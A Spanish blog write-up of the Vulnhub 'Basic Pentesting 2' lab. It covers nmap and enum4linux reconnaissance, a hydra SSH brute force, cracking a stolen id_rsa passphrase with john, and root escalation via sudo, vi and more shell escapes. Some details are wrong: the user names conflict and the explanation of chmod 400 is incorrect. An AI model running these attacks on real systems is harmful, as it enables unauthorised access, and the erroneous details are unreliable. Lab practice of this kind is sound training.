---
title: "Vulnhub #1: CSEC Basic Pentesting 2"
description: Pentesting a máquina CSEC 2 en Vulnhub
date: 2025-05-10
scheduled: 2025-05-10
tags:
  - hacking
layout: layouts/post.njk
---

Puedes descargar la máquina vulnerable desde [vulnhub](https://www.vulnhub.com/entry/basic-pentesting-2,241/)

## Descubrimiento de hosts

Usamos `sudo netdiscover` para descubrir los host en la red.

Estas son las dos máquinas del laboratorio:

```plaintext
Kali(VM):     192.168.0.16
Victima:      192.168.0.17
```

## Reconocimiento

El escaneo de servicios nos arroja el siguiente resultado:

```
22/tcp  open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
```

Si lanzamos `nmap -sT -sV -A -vvv 192.168.0.17` no obtenemos ninguna vulnerabilidad explotable.

Sin embargo, podemos intentar enumerar usuarios de samba con `enum4linux <ip>`
Obtenemos dos usuarios:

```plaintext
kay
jan
```

## Explotación
### SSH

Lanzamos hydra con rockyou.txt usando `hydra -l kay -P ./rockyou.txt ssh://192.168.0.17`

La contraseña es `armando`

Una vez dentro podemos hacer `ls -lisaR /home` para analizar las carpetas de usuarios.

Ahi podemos ver que en la carpeta .ssh del usuario kay tiene un `id_rsa` con permisos globales de lectura.

```
/home/kay/.ssh:
total 20
798691 4 drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
786930 4 drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
798921 4 -rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
798917 4 -rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
798918 4 -rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
jan@basic2:~$ cat /home/kay/.ssh/id_rsa
```

### Usando una clave robada

Podemos copiar el archivo y usarlo para intentar entrar en la maquina con `ssh kay@ip -i clave-robada`

Whooops! Nos devuelve esto:

```plaintext
Permissions 0664 for 'id_key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_key": bad permissions
```

Debemos dar permisos de lectura y escritura para usuario y grupo con `chmod 400 clave-robada`

Ahora nos pide la contraseña de la clave.

Esa contraseña está DENTRO de nuestro archivo `clave-robada`.

Convierte la clave a un formato que john entienda con `ssh2john clave-robada > clave-formato-john`

Una vez listo podemos romper la contraseña con `john clave-formato-john --wordlist=rockyou.txt`

```plaintext
beeswax          (clave-robada)     
1g 0:00:00:00 DONE (2024-09-17 06:09) 12.50g/s 1034Kp/s 1034Kc/s 1034KC/s behlat..bball40
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Si hacemos `ssh kay@ip -i clave-robada`

Nos pedirá la contraseña `beeswax` descubierta antes.

Estamos dentro!

¿Que podemos hacer ahora?

### Escalando privilegios

Podemos volver a usar `ls -lisaR /home` para listar de nuevo por si hubiera cosas que no hemos visto antes

Tenemos un `pass.bak` que podemos leer:

```plaintext
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

Si intentamos usar `sudo -l` para ver que podemos lanzar nos pedirá una contraseña.

Podemos pasar esa contraseña y ver que podemos lanzar `sudo su`

```plaintext
[sudo] password for kay: 
Matching Defaults entries for kay on basic2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kay may run the following commands on basic2:
    (ALL : ALL) ALL
```

Tras lanzarlo, ya somos `root`.


#### Otras formas de conseguir `root`:

##### sudo vi

```plaintext
sudo vi
Escribimos :!sh y nos devuelve una consola root
```

##### more

```plaintext
Escribimos un archivo relativamente largo y lo abrimos con `more` y tenemos algo similar a vi
Con !sh podremos abrir otra consola.
```
